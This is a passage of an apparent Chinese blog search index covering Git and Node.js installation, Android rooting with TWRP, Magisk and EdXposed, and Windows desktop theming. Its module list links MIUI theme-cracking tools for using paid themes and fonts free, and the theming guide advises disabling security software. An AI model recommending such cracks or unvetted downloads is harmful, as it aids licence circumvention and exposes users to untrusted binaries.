在这七月临近的日子，希望会遇见一个懂你的人，懂你的快乐和忧伤，懂你的心酸和无奈，能懂你的累，懂你的苦，懂你的倔强，也懂你的坚持。 不言不语，不是不说，只是不想说，无声无息，不是无心，只是没人懂。真正喜欢你的人不一定是最懂你的人，但他一定是最愿意去懂你的人。往后余生，找一个懂你的人，知你悲欢，解你忧愁。"},{"title":"C语言思维导图","path":"/post/4553.html","text":"注：转自：hirak0"},{"title":"Win 上安装Git和node.js","path":"/post/c402.html","text":"本文介绍Win上安装Gitd 和node.js方法个人安装的环境：（快速安装基本简单；下一步默认其实也可以；看图就懂） Windows10 64bit Git 2.13.0(下载 git网址 ： https://git-scm.com/download） 安装步骤安装https://cdn.jsdelivr.net/gh/wkif/CDN/img/git/1.png 路径选择 选择安装组件当然建议全选哈 组件 创建菜单文件夹 修改系统的环境变量 选择SSL的证书 https：（全称：Hyper Text Transfer Protocol over Secure Socket Layer）简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。 配置行尾结束符 配置终端仿真 大多数其他Cygwin&#x2F;MSYS终端一样，MinTTY也是基于pseudo终端(“pty”)设备的。但是MinTTY并不能完全替代windows的命令提示符。windows上自带简单的文本输出的原生态的命令提示符通常可以很好的工作，但交互性更好的诸如MinTTY这样的应用程序却可能出现故障——虽然通常都有应对方案。这就是为什么MinTTY不能完全替代windows自带的命令提示符 其他的配置–默认即可 等待安装测试 后续如果中文没有正常显示，请求鼠标右击选择“option”选项，更换语言即可中文 转自：作者：weir_will链接：https://www.jianshu.com/p/414ccd423efc来源：简书 node.js下载链接：https://nodejs.org/en/安装步骤：一路默认就行（安装路径根据自己需要更改） 验证软件正确安装同时按下Win键和R键（或者点击“开始菜单”-&gt;点击“运行”）,打开运行窗口,输入“cmd”然后输入以下命令，结果与下图相同则说明安装正确，若不正确可以卸载软件重新安装 git --version node -v npm -v"},{"title":"玩机汇总（一）：刷机常识，双清，BL，REC，TWRP","path":"/post/25c1.html","text":"本文介绍手机刷机常识，双清，BL，REC，TWRP 前排提示：本文转载自一加社区：http://www.oneplusbbs.com/thread-3851619-1-1.html 对于刷机里面一些概念的理解首先，小白们的手机出了问题，论坛里的大佬们提出了解决方法，小白们却还是不会操作，根目录是什么呢，双清又是啥？下面我就对一些操作做一些简单的解释： BL锁BL锁就是bootloader锁，BL从安卓问世以来一直存在，它的功能在我看来应该是限制用户刷第三方ROM和降级系统。在锁住bl的情况下，用户是根本不可能刷第三方ROM和第三方recovery的，最多也就是刷个基于官方的精简包。bl还有一个恶心的限制就是root，所有要root的机器，都必须解锁才能获取。那有人就问了，为什么以前的老机器和安卓4点几的机子都可以一键root呢，这是因为以前的机器bl锁等级低，我们可以利用bl锁的漏洞，绕过bl解锁。然而现在的系统BL等级比较高，自然就无法绕过BL锁去root了。 RECREC是Recovery的缩写，是每部安卓机出厂时自带的恢复模式，不过那都是官方的Recovery。Recovery就是像是电脑上的小型winPE系统，winPE可以在电脑上安装操作系统，或者做些备份、管理的工作。如果把手机比喻成房屋，那么地皮就像手机的硬件，房子像手机系统，建房子的各种工具就是就是Recovery了。官方Recovery只能用来刷入官方的系统，如果你想刷入别的系统，只能通过第三方Recovery来实现，但是，你平时所用到的在线升级也就是OTA升级，是基于官方Rec的，如果你刷入了第三方Rec，OTA升级就会失败。 TWRPTWRP是国外android爱好者开发的一个第三方REC，全名是：TeamWin Recovery Project，也是我们现在刷第三方ROM通常用到的REC。 双清` wipe data/factory reset：清除用户数据并恢复出厂设置 wipecache partition：清除系统缓存 ， 一般刷机前执行，具体看资源发布者的要求。` 三清` wipe data/factory reset：清除用户数据并恢复出厂设置 wipe cache partition：清除系统缓存 wipe dalvik cache：清除安卓虚拟机缓存 具体看资源发布者的要求。 ## [](#四清 \"四清\")四清 wipe data/factory reset：清除用户数据并恢复出厂设置 wipe cache partition：清除系统缓存 wipe dalvik cache：清除安卓虚拟机缓存 wipe system：清除系统 该操作可以更干净地刷入新系统，但并不建议也尽量不要四清，具体看资源发布者的要求。 在这里我要说一下，很多人会觉得四清五清等多清会让刷入的系统更干净，其实这是一种误区，这样子很容易引起手机卡信号基带异常，例如电信卡无法出现4G+等情况出现，内存卡异常等问题，很多人说刷机过后信号没了，就是刷机多清的问题，除了首次刷机需要格式化内存卡，刷回官方固件的时候会自动清卡以外，其他时候完全没必要多清。 System这个分区基本包含了整个安卓操作系统，包括安卓用户界面、和所有预装的系统应用程序。擦除这个分区，会删除整个安卓系统，但不会导致不能启动。你可以通过进入Recovery程序，安装一个新ROM，也就是新的安卓系统。双清三清四清会清空个人的用户数据包括 ：应用程序、短信信息、联系人、通讯录、应用数据等等…，但不会清空内置卡如 图片、音乐、个人文件等等（此话来源于DK大佬……懒得打直接复制了）。 ## [](#根目录 \"根目录 \")根目录 楼主想了一下，觉得有必要为小白们科普一下什么是根目录。根目录指逻辑驱动器的最上一级目录，它是相对子目录来说的。点开手机内部储存看到的就是手机的根目录，同理，在电脑上也是一样，打开“我的电脑”，双击C盘就进入C盘的根目录，双击D盘就进入D盘的根目录，点开游戏文件夹看到的就是游戏的根目录。 # [](#刷机过程和图文操作详解 \"刷机过程和图文操作详解\")刷机过程和图文操作详解 ## [](#如何在无需解BL锁不ROOT的情况下刷官方系统？ \"如何在无需解BL锁不ROOT的情况下刷官方系统？\")如何在无需解BL锁不ROOT的情况下刷官方系统？ 直接官方REC刷入官方ROM（全量包）：把官方刷机包放到手机根目录，进入设置-系统升级，点一下系统升级右上角的齿轮。选择本地升级，选择你刚才放入的官方刷机包，就跟平时升级一样的，不过降级建议恢复出厂设置。 ## [](#如何ROOT以及刷入第三方系统？ \"如何ROOT以及刷入第三方系统？\")如何ROOT以及刷入第三方系统？ 这两种操作的前提都是解BL锁和刷入第三方REC：TWRP。 第一次ROOT和刷机需要电脑，看到这里，如果你的手机没有解过BL锁而且身边没有电脑，那么你现在可以暂时放弃学习这篇帖子了。 ROOT：（第一次的话解BL锁→刷入第三方REC：TWRP，以后不用进行此操作）→把ROOT包放在手机根目录，长按音量减和电源键，进入REC（recovery mode）,也就是TWRP界面安装ROOT包。（注意，安卓8.0系统的ROOT包只能选Magisk。) 最常见的ROOT包有两种：supersu和Magisk。 如果想卸载，直接卡刷卸载包 刷入第三方系统：（第一次的话解BL锁→刷入第三方REC：TWRP，以后不用进行此操作）→把系统ROM包放在手机根目录，长按音量减和电源键，进入REC（recovery mode）,也就是TWRP界面，安装下载的系统ROM。"},{"title":"玩机汇总（二）：小米手机解锁与刷开发版","path":"/post/ee61.html","text":"本文记录我几年的玩机记录和经验，以小米手机的玩机经验为主有变砖风险。玩机有风险，搞机需谨慎。 手机解锁前言：手机解锁每个品牌都有不同的方法，华为的以前可以申请解锁码解锁，但之后直接关闭了解锁通道，所以华为手机可玩性不高。ov系一直没有开通root权限，oppo旗下子品牌realme（本人目前的手机）到有可以解锁的。魅族也有官方的解锁通道。本文以小米解锁为例。 解锁即解bl锁，解除bl锁后我们就可以自由的刷机与刷入rec了，而如果我们不解锁，我们就只能通过有限的刷机方式来刷机，譬如通过官方rec进行更新，但是官方rec只能刷官方指定的刷机包，而如果想要刷入第三方刷机包都需要解除bl锁。 解除bl锁的教程： 注意事项： 你必须要有小米账号，且小米账号在你的小米手机上登录了超过24个小时 你需要一台电脑，一个usb数据线，原装的最好。 如果你只是想刷开发版，可以下滑到刷开发版的教程，刷入开发版不需要解锁bl锁！ 解锁需要申请解锁码，申请后需要等待一到三个工作日，所以无法立即解锁。 解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！解锁后会清除数据，请先备份数据！ 下载解锁工具进入MIUI论坛，网址： 小米解锁地址 点击立即解锁 下载解锁工具到电脑，解压 miflash_unlock.exe 就是解锁程序。 开启开发者模式打开手机，进入设置–我的设备–全部参数 多次点击MIUI版本，知道弹窗显示“已进入开发者模式” 回退到设置主界面 点开“更多设置” 点击开发者选项（这里前面没有多次点击MIUI开启的话是没有这个选项的） 开启开发者选项和USB调试 这里插一句,这里有个设备解锁状态是可以看是否账号与手机绑定的，如果没有绑定，绑定后要24h后才能解锁 连接手机解锁把手机关机，同时按住开机键和音量下键（音量减键）； 按住7s后，手机会亮屏，如果屏幕是这个内容 说明你已经进入Bootloader模式了。 这时候，把手机用usb数据线连接到电脑上。 打开解压工具，找到miflash_unlock，双击运行 同意免责条款后登陆小米账号 之后会验证是否支持解锁 之后点击解锁就好了 刷入开发版miui下载刷机包下载地址：MIUI下载 选择对应手机版本（以小米6为例）下载开发版安装包将手机连接电脑，划出状态栏，选择正在通过USB充电（如果在这之前你更改过设置，也有可能会是正在通过USB传输照片&#x2F;传输文件）打开此电脑，选择你的手机 找到downloaded_rom文件夹，并打开把你下载的开发版刷机包复制到downloaded_rom文件夹里，断开手机与电脑的连接。 并保证手机有50%以上的电量。打开设置–我的设备 选择MIUI版本，在MIUI版本界面点击右上角 选择手动选择刷机包，找到downloaded_rom，选择你的ROM，刷机即可。 参考：小米手机解锁与刷开发版教程 - 八重樱的文章 - 知乎https://zhuanlan.zhihu.com/p/62107666"},{"title":"玩机汇总（三）：刷入第三方rec 与magisk、Edx安装","path":"/post/6255.html","text":"本文介绍手机第三方rec刷入和magisk、Edxp的安装有变砖风险。玩机有风险，搞机需谨慎。 前言什么是第三方rec？Recovery模式指的是一种可以对安卓机内部的数据或系统进行修改的模式（类似于windows PE或DOS）。在这个模式下我们可以刷入新的安卓系统，或者对已有的系统进行备份或升级，也可以在此恢复出厂设置，按类型分为官方的rec和第三方rec（CWM REC和TWRP REC。REC是Recovery的缩写，是每部安卓机出厂时自带的恢复模式，不过那都是官方的Recovery。官方Recovery只能用来刷入官方的系统，如小米rec 如果你想刷入别的系统，只能通过第三方Recovery来实现，但是，你平时所用到的在线升级也就是OTA升级，是基于官方Rec的，如果你刷入了第三方Rec，OTA升级就会失败。 TWRPTWRP是国外android爱好者开发的一个第三方REC，全名是：TeamWin Recovery Project，也是我们现在刷第三方ROM通常用到的REC。twrp官网 此教程是线刷rec教程 什么是magisk？官网：https://magiskmanager.com/ Magisk 是出自一位台湾学生 @topjohnwu 开发的 Android 框架，是一个通用的第三方 systemless 接口，通过这样的方式实现一些较强大的功能。看似很简单的一个框架，甚至与大名鼎鼎的 Xposed 框架在功能性上有点重复。很多人批评 Magisk的模块太少了，想替代 Xposed 根本不可能（在那个 Xposed Framework for Android 7.0 难产的时代，很多人将 Magisk 看是做是 Xposed 的替代品）。这是不正确的，因为 Magisk 从来没有想过要代替 Xposed ，Magisk 与 Xposed 是可以互相兼容的，你甚至可以通过 Magisk 来安装 Xposed（安装 Xposed 后就不能绕过 SafetyNet 了）。 Magisk 的厉害之处在于它实现了一种绕过 SafetyNet 使用 root 的方法。 实现原理：由于它是通过启动时在 boot 中创建钩子，把 &#x2F;data&#x2F;magisk.img 挂载到 &#x2F;magisk，构建出一个在 system 基础上能够自定义替换，增加以及删除的文件系统，所有操作都在启动的时候完成，实际上并没有对 &#x2F;system 分区进行修改（即 systemless 接口，以不触动 &#x2F;system 的方式修改 &#x2F;system）。 转自：作者：Mogeko丶链接：https://www.jianshu.com/p/393f5e51716e来源：简书 3.什么是Edxp?官网：https://github.com/ElderDrivers/EdXposed/releases/ Edxposed全称 Elder driver Xposed Framework，简称edxp.大名鼎鼎的xposed框架可以实现QQ抢红包，微信抢红包，防止消息撤回等功能。xposed也是所有android系统获取root后必装的东西。但可惜，自从android 7.0之后xposed的开发者rovo89基本就不维护了，针对android 8.0的版本草草发布了一个测试版本撒手不管了。现在越来越多的新机型出厂就是android 9.0系统，那么怎么才能继续使用xposed框架，如何才能继续快乐的抢红包呢？其实有办法！xposed虽然死了，但它却不再是唯一。比如今天我要提到的Edxposed框架，Edxposed全称 Elder driver Xposed Framework，简称edxp，Edxposed框架现在支持android 8.0 -android 9.0 ，如果是android 7.0或更早的版本，推荐使用xposed框架。针对框架的安装问题，官方推出了Magisk模块的安装方式，也就是提供了一个zip压缩包，在Magisk中安装重启即可。在安装edxposed的magisk模块之前，你需要先安装riru的magisk模块。本文主要是Magisk安装Edx。 参考：作者：coderstory《后Xposed时代: 一篇文章看懂如何安装和使用Edxposed》https://blog.coderstory.cn/guide-install-edxposed/ 刷入第三方rec下载准备准备：电脑 数据线 手机 所需工具来自 rom乐园 参考教程：http://www.romleyuan.com/lec/read?id=201 小米全机型TWRP一键刷机工具： 百度网盘下载：https://pan.baidu.com/s/1K0VuCxwwKT9OI3yCouV3Gg高速下载，请关注微信公众号：ROM乐园 回复关键字：全机型recovery下载 twrp机型下载地址汇总链接：https://pan.baidu.com/s/1zIZ9ObMiKwjlW3LvpOixMw提取码：9kam 刷入解压刷入RECOVERY工具并打开 彻底关闭手机，音量下和开机按键进入fastboot模式双击运行一键刷入RECOVERY.bat脚本 提示连接成功后，根据提示一步步刷完RECOVERY刷机完成后，会自动进入RECOVERY，或者提示进入RECOVERY方法 小米手机进入TWRP_Recovery教程：开机状态下，选择重启手机，按住音量山不松手，即可进入TWRP_Recovery 关机状态下，长开机键和音量上不松手，震动后松开开机按键，保持音量上 不松手，等待手机自带进入twrp界面 刷入magisk安装 Magisk 需要解锁 Bootloader 并刷入第三方 Recovery。所以每个品牌的手机都或多或少的有点不一样，这里只介绍一个标准的流程， 下载准备网站下载magisk包； 下面提供个人云盘的下载：magisk app:链接：https://pan.baidu.com/s/1YXTdIAbbp0xMoBT0UWFboA提取码：p15w magisk v20.4链接：https://pan.baidu.com/s/1q6kBqFDuAVIQeQ2KRji0sw提取码：mzd5 magisk卸载包 链接：https://pan.baidu.com/s/1UjigsfnuHwFpC1YkjNLrQQ提取码：6lg7 下载 APP 和magisk v20.4 就好了 方法首先将下好的magisk v20.4 包放入手机中 进入第三方 Recovery（以 twrp 为例） 安装刷机包 找到我让你放在硬盘中的那个包（后缀为 .zip） 滑动滑块，开始刷机 刷好后立即重启。 至此，magisk安装完毕。 模块 magisk安装之后可以安装很多模块实现对手机的功能扩展。具体的模块分享会专门出一个板块。 刷入 Edx下载准备：有了magisk之后安装Edxp相对比较简单，Edxp作为一个Magisk模块被刷入。以前需要刷入 Riru Core和Edx两个模块，但之后有大佬对模块进行了整合，这里分享的就是整合后的模块，用magisk输入后就可以了。 Magisk模块-EdXposed完整框架v2.7Y版链接：https://pan.baidu.com/s/1oxvrpwnWLQWzoQJKYroOUw提取码：a9dk 安装下载之后进入第三方rec ，找到模块安装重启之后一般就会出现 Edx的图标 至此，Edxp安装完毕。 模块Edxp 也有很多模块，模块分享会和Magisk模块一起发出。 后话magisk 和Edxp是我个人用的比较多的，当然市面上还有太极之类的玩机软件也不错，有想法的可以去试试。 此次教程参考转载了很多大佬的文章，主要在于自己表达水平不行，在此对这些大佬表示感谢。如有侵权，请联系我删除。"},{"title":"玩机汇总（四）：magisk模块和Edxp模块分享","path":"/post/6ff5.html","text":"本文介绍magisk模块和Edxp模块分享，均为网络资源为尊重原作者劳动成果，最大程度保证模块来自原作者分享网页在此对各个大佬表示感谢，如有问题，请联系我删除。 前排提示：每个模块对每个手机兼容性无法保证，模块之间也有可能会有冲突，有变砖风险。玩机有风险，搞机需谨慎。 magisk 模块MM管理器-2018.09.16 汉化作者：链接：https://pan.baidu.com/s/14ZeKBRdC9DJly00FwkTXpg提取码：27wk功能：可在rec模式卸载已安装模块，可用来救砖。（高版本的第三方rec已具备此功能） 小米 mixAlpha 机型模块作者：酷安 坏叔叔_hi网址（作者原分享网址）：https://www.lanzous.com/i9yvlkf?t功能：将手机型号修改为 MixAlpha 更多机型模块可以在酷安侯旭Hxv主页寻找 AD 影视 Hosts1.2作者：依然的爱网址：链接：https://pan.baidu.com/s/15-J1saudJheohBFJZpWyOg提取码：zr37功能：屏蔽各类广告包括(各大视频网站,运营商劫持广告，大部分APP广告),hosts规则均来自于网络搜索,github,人工抓取及酷友提供，使用时请关闭其他hosts模块,请关闭systemless hosts模块(如果有)。 Magisk-超级快充2.0作者：链接：链接：https://pan.baidu.com/s/1Nj0ngsQkjMGeT0PvmWGllA提取码：p7m4功能：快充 Magisk-毒液 完整版（适合开机慢）作者：链接：https://pan.baidu.com/s/14fz045q_CbY3bGgyvD7WDg提取码：a6nd功能：改变开机动画 Magisk-黑域启动插件作者：链接：https://pan.baidu.com/s/1LeyI462PzAHSndWNelg9UQ提取码：2spa Magisk_浪漫雅圆+Sleek+Google(综合字体)作者：链接：https://pan.baidu.com/s/1rpOyQKVmI9dQIVwCC2ER4Q提取码：hq66功能：修改系统字体 充电90％自动暂停作者：链接：https://pan.baidu.com/s/1Lgk4keO6oRAcMZIqLaxZ6Q提取码：jrtk功能：充电90％自动暂停 其他个人收集模块链接：https://pan.baidu.com/s/1AdRqJlDClp0qKn9njXejzg提取码：r87o 链接：https://pan.baidu.com/s/1Wx6CnfhOSTURk_72uf1mQg提取码：53tv ！！玩机有风险，搞机需谨慎。！！ Edxp模块edxp 上有模块下载，也可以去edxp上下载 哔哩漫游作者：iAcn&#x2F;djytw&#x2F;yujincheng08哔哩漫游 (BiliRoaming) - http://repo.xposed.info/module/me.iacn.biliroaming功能：解除B站番剧区域限制港澳台CDN加速缓存番剧支持国际版和概念版自定义主题色关闭青少年模式弹窗显示评论区楼层概念版添加直播入口不以小程序形式分享 网易云音乐插件作者：Specher网易云音乐插件 - http://repo.xposed.info/module/com.specher.music163功能：一个网易云音乐的Xposed插件。目前功能：自动签到、跳过启动广告、本地数据修改、美化功能。最佳适配4.3.X，理论任意版本通用 云村清洁工作者：xmodule.org云村清洁工app是一款非常好用的网易云插件，需要XP框架，搭配食用非常舒服，避免提示应用升级重要：使用的是七牛云镜像下载，请勿在xposed install内下载！！！！请直接用浏览器访问： https://repo.xposed.info/module/me.zjns.lovecloudmusic下载 1、禁止签到跳转商城；2、去除启动页，评论区等位置广告；3、伪装成谷歌版，避免提示升级。、 涉及到各种CD问题，不再更新。你可以关注微信公众号: xmodule 回复: 云村清洁工 下载我最新编译的版本 WeXposed （微X模块）作者：fkzhang http://repo.xposed.info/module/com.fkzhang.wechatxposed功能：-防止微信撤回消息 转发微信聊天里的图片和小视频到朋友圈 转发聊天里的多张图片（最多9张）到朋友圈 转发语音给朋友 转发收藏内容 转发朋友圈里的内容到自己的朋友圈 分享图片和小视频 屏蔽群聊成员 自动查找僵尸粉 批量删除好友 批量删除僵尸粉 自动回复 自定义表情最高限额 自动领取红包、转账 等等。。。 请谨慎使用自动领取红包功能！ QXposed （QX模块）作者：fkzhang http://repo.xposed.info/module/com.fkzhang.qqxposed功能：-防止QQ撤回消息-自动领取红包-控制骰子-支持TIM chimi作者：yonhhen链接：https://github.com/yonghen/chimi-/releases功能：MIUI主题破解 MIUI主题防恢复作者：夢月時歌链接https://www.wenshushu.cn/f/2s1mm0vm3bx功能：启MIUI主题破解模块，有效防止主题自动恢复默认。可用第三方主题，免费使用付费字体。"},{"title":"win桌面美化教程","path":"/post/74c4.html","text":"win桌面美化教程Win桌面美化教程在这记录下个人win 美化入坑的一些经验，主要是怕自己以后忘了怎么搞的 more 先上一波成品图 ​目录​1.文件rainmeter :链接：https://pan.baidu.com/s/1lgWzoQYrZwnBk1uUB2bgJA 提取码：35272.配置美化主要需要 win主题，rainmeter， 透明状态栏等等东西2.1 注意事项为避免造成错误，一般最好先关闭各种安全软件，创建系统还原点右击“我的电脑” 点击“属性”​点击“系统保护” 点击“创建” 随便输入，点击创建，等待一会就创建好了 创建系统还原点的目的是备份下之前的设置，以便以后想恢复的时候恢复 2.2 rainmeter 安装与使用Rainmeter是一款美化桌面的软件，可以加载各种桌面摆件：天气，时间，快捷方式，RSS，播放器，系统信息监控等安装并运行 Rainmeter 程序，即可双击雨滴皮肤运行，部分雨滴皮肤是文件夹式的，复制到C:\\Users\\用户名\\Documents\\Rainmeter\\Skins内，在任务栏托盘处找到白色小水滴的图标，双击打开配置面板，在左侧选择.ini文件，选择加载。比较占用系统资源，老爷机谨慎安装；新手在安装时不要选择便携模式，否则无法正常安装皮肤。下面是我收集到的一些插件包（资源来自网络，侵删）使用方法：解压到C:\\Users\\用户名\\Documents\\Rainmeter\\Skins目录下，在rainmeter 管理器里安装就好了，桌面上课一拖到任意位置 时钟插件 链接：https://pan.baidu.com/s/1S2tf6RUv2fK_-yVFQ-sdvQ 提取码：1tpe频谱和时间 链接：https://pan.baidu.com/s/1aIdue3BuPRKk_HgTnSkl-A 提取码：9kb9布卡娘 链接：https://pan.baidu.com/s/1ePNvoTSX1FvYkqx0dHB11A 提取码：iyko侧边栏 链接：https://pan.baidu.com/s/1YMuRB9hzRITqdmya_W2Nhw 提取码：egia皮肤 链接：https://pan.baidu.com/s/1nDnacaIoY9Tt7YPh1kzh2A 提取码：zaa82.3 透明化状态栏这个就是一个软件达到的效果软件名： TranslucentTB下载：链接：https://pan.baidu.com/s/14K4zASY82_TByhgTq9mDGA 提取码：axer2.4 然后就是一些好康的壁纸了！！链接：https://pan.baidu.com/s/1sxkKiuqJBbpJm6rTWP-PDg 提取码：m731魔法阵 链接：https://pan.baidu.com/s/1tD5ZI0-zIqnlfv18P__DEQ 提取码：6dkd 2.5 仿mac状态栏就是动图中那个东西，也只是一个软件达到的效果软件名:mydock链接：https://pan.baidu.com/s/1RDH85lhHjFxo2ye342vKLg 提取码：xljl—————————————–END——————————有时间的话在写一下自定义磁贴的"}]